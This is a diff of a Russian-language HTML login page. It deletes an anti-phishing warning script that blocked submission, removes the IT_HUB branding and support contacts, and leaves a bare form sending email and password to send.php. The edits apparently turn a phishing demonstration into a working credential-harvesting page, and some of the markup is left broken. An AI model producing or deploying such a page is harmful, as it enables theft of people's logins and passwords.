@@ -17,8 +17,6 @@
             height: 100vh;
             background-color: #f8f9fc;
         }
-
-        /* Шапка сайта */
         header {
             display: flex;
             justify-content: space-between;
@@ -47,13 +45,7 @@
             cursor: pointer;
             font-size: 14px;
             text-decoration: none;
-            transition: background 0.3s;
         }
-        .login-button:hover {
-            background-color: #7f00cc;
-        }
-
-        /* Стили для центрированной формы */
         .container {
             background: #ffffff;
             border-radius: 12px;
@@ -61,25 +53,14 @@
             padding: 30px;
             width: 350px;
             text-align: center;
-            margin-top: 80px; /* Отступ из-за фиксированной шапки */
+            margin-top: 80px; /* Для фиксированной шапки */
         }
-        h2 {
-            color: #333333;
-            margin-bottom: 20px;
-        }
-        input[type="text"],
-        input[type="password"] {
+        input[type="text"], input[type="password"] {
             width: 90%;
             padding: 10px;
             margin: 10px 0;
             border: 1px solid #e0e0e0;
             border-radius: 5px;
-            font-size: 14px;
-            outline: none;
-        }
-        input[type="text"]:focus,
-        input[type="password"]:focus {
-            border: 1px solid #7f7fff;
         }
         .button {
             width: 90%;
@@ -89,54 +70,23 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 16px;
-            transition: background 0.3s;
-        }
-        .button:hover {
-            background-color: #7f00cc;
-        }
-        a {
-            text-decoration: none;
-            color: #7f00cc;
-            font-size: 14px;
-        }
-        p {
-            font-size: 12px;
-            color: #999;
-        }
-        .support {
-            margin-top: 15px;
-            font-size: 12px;
         }
     </style>
-    <script>
-        // Предупреждение при попытке отправки формы
-        function phishingWarning(event) {
-            event.preventDefault();
-            alert("Внимание! Эта страница может быть фишинговой. Никогда не вводите свои логины и пароли на подозрительных сайтах.");
-        }
-    </script>
 </head>
 <body>
-    <!-- Шапка сайта -->
     <header>
-        <a href="#" class="logo">IT_HUB</a>
+        <a href="#" class="logo">LOGO</a>
         <a href="#" class="login-button">Войти</a>
     </header>
 
-    <!-- Основной контейнер формы -->
+    <!-- Форма отправки данных -->
     <div class="container">
         <h2>Добро пожаловать!</h2>
-        <form method="post" action="#" onsubmit="phishingWarning(event)">
         <form method="post" action="send.php">
             <input type="text" name="email" placeholder="Email" required>
             <input type="password" name="password" placeholder="Пароль" required>
             <button type="submit" class="button">Войти</button>
         </form>
-        <div class="support">
-            <a href="#">Забыли пароль?</a>
-        </div>
-        <p>Столкнулись с трудностями?<br>Напишите на почту <b>newlxp@ithub.ru</b></p>
     </div>
 </body>
 </html>
